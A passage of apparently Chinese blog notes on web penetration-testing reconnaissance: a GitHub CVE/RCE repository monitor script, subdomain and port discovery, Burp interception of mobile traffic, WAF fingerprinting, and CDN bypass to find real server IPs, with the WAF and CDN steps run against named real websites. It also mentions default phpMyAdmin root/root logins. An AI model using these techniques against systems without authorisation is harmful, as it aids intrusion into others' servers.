spellcheck="true">#每隔20秒爬取一次</span>while<span class="token punctuation">(</span>True<span class="token punctuation">)</span>:    headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token string">"User-Agent"</span><span class="token keyword">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token comment" spellcheck="true">#判断文件是否存在</span>    datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    response1<span class="token operator">=</span>None    response2<span class="token operator">=</span>None    <span class="token keyword">if</span> os.path.exists<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span><span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#如果文件存在则每次爬取10个</span>        <span class="token function">df</span> <span class="token operator">=</span> pd.read_csv<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span>, header<span class="token operator">=</span>None<span class="token punctuation">)</span>        datas <span class="token operator">=</span> df.where<span class="token punctuation">(</span>df.notnull<span class="token punctuation">(</span><span class="token punctuation">)</span>,None<span class="token punctuation">)</span>.values.tolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将提取出来的数据中的nan转化为None</span>        response1 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10"</span>,                                 headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        response2 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10"</span>,                                 headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    else:        <span class="token comment" spellcheck="true">#不存在爬取全部</span>        datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        response1 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc"</span>,headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        response2 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc"</span>,headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    data1 <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>response1.text<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>response2.text<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span>,data2<span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>:        <span class="token keyword">for</span> i <span class="token keyword">in</span> j:            s <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"name":i['name'],"html":i['html_url'],"description":i['description']&amp;#125;</span>            s1 <span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>,i<span class="token punctuation">[</span><span class="token string">'html_url'</span><span class="token punctuation">]</span>,i<span class="token punctuation">[</span><span class="token string">'description'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> s1 not <span class="token keyword">in</span> datas:                <span class="token comment" spellcheck="true">#print(s1)</span>                <span class="token comment" spellcheck="true">#print(datas)</span>                params <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                     <span class="token string">"text"</span>:s<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>,                    <span class="token string">"desp"</span><span class="token keyword">:</span><span class="token string">" 链接:"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">"html"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>+<span class="token string">"\n简介"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                print<span class="token punctuation">(</span><span class="token string">"当前推送为"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>+<span class="token string">"\n"</span><span class="token punctuation">)</span>                print<span class="token punctuation">(</span>params<span class="token punctuation">)</span>                requests.get<span class="token punctuation">(</span><span class="token string">"https://sc.ftqq.com/XXXX.send"</span>,params<span class="token operator">=</span>params,timeout<span class="token operator">=</span>10<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#time.sleep(1)#以防推送太猛</span>                print<span class="token punctuation">(</span><span class="token string">"推送完成!"</span><span class="token punctuation">)</span>                datas.append<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>            else:                pass                <span class="token comment" spellcheck="true">#print("数据已处在!")</span>    pd.DataFrame<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>.to_csv<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span>,header<span class="token operator">=</span>None,index<span class="token operator">=</span>None<span class="token punctuation">)</span>    time.sleep<span class="token punctuation">(</span>time_sleep<span class="token punctuation">)</span></code></pre><h4 id="常见的子域名收集方法"><a href="#常见的子域名收集方法" class="headerlink" title="常见的子域名收集方法"></a><font size="4"><strong>常见的子域名收集方法</strong></font></h4><p><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/2.png"></p><h3 id="二、黑暗引擎使用"><a href="#二、黑暗引擎使用" class="headerlink" title="二、黑暗引擎使用"></a><font size="5"><strong>二、黑暗引擎使用</strong></font></h3><p>fofa:<a href="https://fofa.so/">https://fofa.so/</a><br><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/3.png"><br>zoomeye:<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/4.png"></p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://crt.sh/">https://crt.sh</a><br><a href="https://dnsdb.io/">https://dnsdb.io</a><br><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a><br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br><a href="https://securitytrails.com/domain/www.baidu.com/history/a">https://securitytrails.com/domain/www.baidu.com/history/a</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-009</title>
      <link href="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/"/>
      <url>/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-APP及其他资产等"><a href="#信息收集-APP及其他资产等" class="headerlink" title="信息收集-APP及其他资产等"></a><font size="6"><strong>信息收集-APP及其他资产等</strong></font></h2><span id="more"></span><h3 id="一、bp抓取手机数据包"><a href="#一、bp抓取手机数据包" class="headerlink" title="一、bp抓取手机数据包"></a><font size="5"><strong>一、bp抓取手机数据包</strong></font></h3><p>手机IP地址：192.168.1.3<br>kali：192.168.1.9</p><p>burp配置<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/1.png"><br>手机配置<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/2.png"><br>抓包测试<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/3.png"><br>配置证书<br>在浏览器中输入192.168.1.9:8888下载证书并重名为ca.cer 然后导入<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/4.png"><br>导入证书：设置-密码与安全-系统安全-加密与凭证-从sd卡安装-然后搜索ca.cer<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/5.png"><br>抓包测试<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/6.png"></p><h3 id="二、对抓取的数据包进行分析"><a href="#二、对抓取的数据包进行分析" class="headerlink" title="二、对抓取的数据包进行分析"></a><font size="5"><strong>二、对抓取的数据包进行分析</strong></font></h3><p>通过对抓取到的数据包进行分析、数据包上面可能有域名有ip地址。对上面的数据包进行信息收集、借助shodan、钟馗之眼、fofa等工具进行端口扫描<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/7.png"><br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/8.png"><br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/9.png"></p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://fofa.so/">https://fofa.so/</a><br><a href="http://tool.chinaz.com/">http://tool.chinaz.com</a><br><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="https://nmap.org/download.html">https://nmap.org/download.html</a><br><a href="https://securitytrails.com/">https://securitytrails.com/</a> 子域名查询<br><a href="https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw">https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw</a> 提取码：k5se</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-008</title>
      <link href="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/"/>
      <url>/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-架构-搭建-WAF等"><a href="#信息收集-架构-搭建-WAF等" class="headerlink" title="信息收集-架构,搭建,WAF等"></a><font size="6"><strong>信息收集-架构,搭建,WAF等</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="*一、前言知识"></a><font size="5">*<strong>一、前言知识</strong></font></h3><p>前言：在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说:渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的!<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/1.png"></p><h3 id="二、站点搭建分析"><a href="#二、站点搭建分析" class="headerlink" title="二、站点搭建分析"></a><font size="5"><strong>二、站点搭建分析</strong></font></h3><h4 id="1、搭建习惯-目录型站点"><a href="#1、搭建习惯-目录型站点" class="headerlink" title="1、搭建习惯-目录型站点"></a><font size="4"><strong>1、搭建习惯-目录型站点</strong></font></h4><pre class=" language-bash"><code class="language-bash">简单的理解就是主站上面存在其他的cms程序例如：    学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs 我们把这个成为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞</code></pre><h4 id="2、搭建习惯-端口类站点"><a href="#2、搭建习惯-端口类站点" class="headerlink" title="2、搭建习惯-端口类站点"></a><font size="4"><strong>2、搭建习惯-端口类站点</strong></font></h4><p><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/2.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/3.png"><br>有的站点不是使用的是默认的站点80而是其他的端口、可以使用shodan这种工具去收集端口</p><h4 id="3、搭建习惯-子域名站点"><a href="#3、搭建习惯-子域名站点" class="headerlink" title="3、搭建习惯-子域名站点"></a><font size="4"><strong>3、搭建习惯-子域名站点</strong></font></h4><p><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/4.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/5.png"><br>备注：现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p><h4 id="4、搭建习惯-类似域名站点"><a href="#4、搭建习惯-类似域名站点" class="headerlink" title="4、搭建习惯-类似域名站点"></a><font size="4"><strong>4、搭建习惯-类似域名站点</strong></font></h4><p>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名的更换<br>可以通过他的旧的域名找到一些突破口<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/6.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/7.png"><br>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息</p><h4 id="5、搭建习惯-旁注-c段站点"><a href="#5、搭建习惯-旁注-c段站点" class="headerlink" title="5、搭建习惯-旁注,c段站点"></a><font size="4"><strong>5、搭建习惯-旁注,c段站点</strong></font></h4><p>旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。<br>C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。<br>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/8.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/9.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/10.png"><br>通过旁注查询可以发现同一个服务器上面有两个站点可以通过对另外的一个站点进行突破。</p><h4 id="6、搭建习惯-搭建软件特征站点"><a href="#6、搭建习惯-搭建软件特征站点" class="headerlink" title="6、搭建习惯-搭建软件特征站点"></a><font size="4"><strong>6、搭建习惯-搭建软件特征站点</strong></font></h4><p>有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境这样的集成环境搭建的危害就是泄露了详细的版本信息。<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/11.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/12.png"><br>phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入</p><h3 id="三、WAF防护分析"><a href="#三、WAF防护分析" class="headerlink" title="三、WAF防护分析"></a><font size="5"><strong>三、WAF防护分析</strong></font></h3><h4 id="1、什么是wAF应用"><a href="#1、什么是wAF应用" class="headerlink" title="1、什么是wAF应用?"></a><font size="4"><strong>1、什么是wAF应用?</strong></font></h4><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><h4 id="2、如何快速识别WAF"><a href="#2、如何快速识别WAF" class="headerlink" title="2、如何快速识别WAF?"></a><font size="4"><strong>2、如何快速识别WAF?</strong></font></h4><p>1、采用工具wafwoof<br>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a><br>安装之前一定要有python的环境不然安装不上</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># unzip wafw00f-master.zip</span><span class="token comment" spellcheck="true"># python3.8 setup.py install</span><span class="token comment" spellcheck="true"># ls -ld wafw00f</span>drwxr-xr-x 6 root root 4096  6月 10 17:22 wafw00f<span class="token comment" spellcheck="true"># cd wafw00f </span><span class="token comment" spellcheck="true">#python main.py https://www.hlszsb.com/</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking https://www.hlszsb.com/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generic Detection results:<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No WAF detected by the generic detection<span class="token punctuation">[</span>~<span class="token punctuation">]</span> Number of requests: 7</code></pre><p>wafw00f的缺点判断的不是特别的准确存在误报或识别不出的情况。</p><p>2、在有些网站的请求信息当中有的网站没有做安全信息上面留下了waf的相关信息<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/13.png"></p><p>3、使用nmap指纹检测</p><pre class=" language-bash"><code class="language-bash">nmap --script<span class="token operator">==</span>http-waf-fingerprintnmap --script<span class="token operator">=</span>http-waf-detec</code></pre><p>4、identYwaf<br>参考地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><pre class=" language-bash"><code class="language-bash">C:\Users\admin\Desktop\security\软件\identYwaf-master<span class="token operator">></span>python identYwaf.py https://www.manjaro.cn/                                    __ __ ____  ___      ___  ____   ______ <span class="token operator">|</span>  T  T __    __   ____  _____l    j<span class="token operator">|</span>   \    /  _<span class="token punctuation">]</span><span class="token operator">|</span>    \ <span class="token operator">|</span>      T<span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">||</span>  T__T  T /    T<span class="token operator">|</span>   __<span class="token operator">|</span> <span class="token operator">|</span>  T <span class="token operator">|</span>    \  /  <span class="token punctuation">[</span>_ <span class="token operator">|</span>  _  Yl_j  l_j<span class="token operator">|</span>  ~  <span class="token operator">||</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>Y  o  <span class="token operator">||</span>  l_ <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  D  YY    _<span class="token punctuation">]</span><span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>___  <span class="token operator">||</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">||</span>     <span class="token operator">||</span>   _<span class="token operator">|</span> j  l <span class="token operator">|</span>     <span class="token operator">||</span>   <span class="token punctuation">[</span>_ <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>     <span class="token operator">!</span> \      / <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">||</span>  <span class="token punctuation">]</span><span class="token operator">|</span>____jl_____jl_____jl__j__j  l__j  l____/   \_/\_/  l__j__jl__j  <span class="token punctuation">(</span>1.0.134<span class="token punctuation">)</span><span class="token punctuation">[</span>o<span class="token punctuation">]</span> initializing handlers<span class="token punctuation">..</span>.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> checking <span class="token function">hostname</span> <span class="token string">'www.manjaro.cn'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> running basic heuristic test<span class="token punctuation">..</span>.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> rejected summary: 200 <span class="token punctuation">(</span><span class="token string">'&lt;title>����ҳ��&lt;/title>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> non-blind match: -<span class="token punctuation">[</span>i<span class="token punctuation">]</span> running payload tests<span class="token punctuation">..</span>. <span class="token punctuation">(</span>45/45<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> results: <span class="token string">'.xx.xxxxx..xxxxxxxx.xxx.x...x.xxx......x..xxx'</span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> hardness: hard <span class="token punctuation">(</span>60%<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> blocked categories: SQLi, XSS, XPATHi, XXE, PHPi, PT<span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> signature: <span class="token string">'90fa:RVZXu261OEhCWapBYKcPk4JzWOpohM4JiUcMr2RXg1uQJbX3uhdOnthtOj+hX7AA16FcPhJOdLoXo2tKaK99n+i7c4RmkgI2FZjxtDtAeq+c3qA4chW1XaTD'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> blind match: <span class="token string">'Safedog'</span> <span class="token punctuation">(</span>100%<span class="token punctuation">)</span></code></pre><p>与wafwoof相比运行速度慢，比较稳定推荐还是使用这一款工具。</p><h4 id="3、识别wAF对于安全测试的意义"><a href="#3、识别wAF对于安全测试的意义" class="headerlink" title="3、识别wAF对于安全测试的意义?"></a><font size="4"><strong>3、识别wAF对于安全测试的意义?</strong></font></h4><p>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</p><h3 id="四、涉及资源："><a href="#四、涉及资源：" class="headerlink" title="四、涉及资源："></a><font size="5"><strong>四、涉及资源：</strong></font></h3><p><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://www.webscan.cc/">https://www.webscan.cc/</a><br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-007</title>
      <link href="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/"/>
      <url>/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-CDN绕过"><a href="#信息收集-CDN绕过" class="headerlink" title="信息收集-CDN绕过"></a><font size="6"><strong>信息收集-CDN绕过</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="*一、前言知识"></a><font size="5">*<strong>一、前言知识</strong></font></h3><p>前言：CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/1.png"></p><h3 id="二、如何判断目标存在CDN服务"><a href="#二、如何判断目标存在CDN服务" class="headerlink" title="二、如何判断目标存在CDN服务?"></a><font size="5"><strong>二、如何判断目标存在CDN服务?</strong></font></h3><pre class=" language-bash"><code class="language-bash">利用多节点技术进行请求返回判断    http://ping.chinaz.com/     http://ping.aizhan.com/  http://ce.cloud.360.cn/</code></pre><p>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN<br>没有使用CDN</p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/2.png"><br>使用CDN<br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/3.png"></p><h3 id="三、CDN对于安全测试有那些影响"><a href="#三、CDN对于安全测试有那些影响" class="headerlink" title="三、CDN对于安全测试有那些影响?"></a><font size="5"><strong>三、CDN对于安全测试有那些影响?</strong></font></h3><pre class=" language-bash"><code class="language-bash">    cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</code></pre><h3 id="四、目前常见的CDN绕过技术有哪些"><a href="#四、目前常见的CDN绕过技术有哪些" class="headerlink" title="四、目前常见的CDN绕过技术有哪些?"></a><font size="5"><strong>四、目前常见的CDN绕过技术有哪些?</strong></font></h3><pre class=" language-bash"><code class="language-bash">子域名查询：                    因为有些主站是做了CDN服务而子站是没有做CDN服务邮件服务查询                    因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。国外地址请求                    因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。遗留文件、扫描全网                    如PHPinfo信息当中会遗留出ip地址黑暗引擎搜索                    fofa、傻蛋、谛听、zoomeye、censys特定文件dns历史记录，以量打量<span class="token comment" spellcheck="true">#CDN真实IP地址获取后绑定指向地址</span>更改本地HOSTS解析指向文件奇淫技巧    fackcdn w8fuckcdnzmap</code></pre><h3 id="五、案例演示获取真实ip"><a href="#五、案例演示获取真实ip" class="headerlink" title="五、案例演示获取真实ip"></a><font size="5"><strong>五、案例演示获取真实ip</strong></font></h3><h4 id="1、以学而思网站为例"><a href="#1、以学而思网站为例" class="headerlink" title="1、以学而思网站为例"></a><font size="4"><strong>1、以学而思网站为例</strong></font></h4><p><a href="http://www.xueersi.com/">www.xueersi.com</a></p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/4.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/5.png"></p><p>xuersi.com<br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/6.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/7.png"></p><p>备注：通过对比发现xueersi.com没有使用cdn直接获取到了真实的IP地址、而其中的IP地址71、72是负载均衡的访问入口。</p><p>验证获取到ip是否可信可以采用第三方的ip地址查询工具经行验证。<br><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/8.png"></p><h4 id="2、www-sp910-com"><a href="#2、www-sp910-com" class="headerlink" title="2、www.sp910.com"></a><font size="4"><strong>2、<a href="http://www.sp910.com/">www.sp910.com</a></strong></font></h4><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/9.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/10.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/11.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/12.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/13.png"></p><h4 id="3、cdn网站"><a href="#3、cdn网站" class="headerlink" title="3、cdn网站"></a><font size="4"><strong>3、cdn网站</strong></font></h4><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/14.png"></p><h3 id="六、涉及资源："><a href="#六、涉及资源：" class="headerlink" title="六、涉及资源："></a><font size="5"><strong>六、涉及资源：</strong></font></h3><p><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a> 历史域名解析<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com</a><br><a href="https://www.get-site-ip.com/">https://www.get-site-ip.com/</a> 查真实ip<br><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a> 海外ping<br><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a><br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&mid=2653939118&idx=1&sn=945b81344d9c89431a8c413ff633fc3a&chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&token=268417143&lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&amp;mid=2653939118&amp;idx=1&amp;sn=945b81344d9c89431a8c413ff633fc3a&amp;chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&amp;token=268417143&amp;lang=zh_CN#rd</a> </p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-006</title>
      <link href="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/"/>
      <url>/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/</url>
      
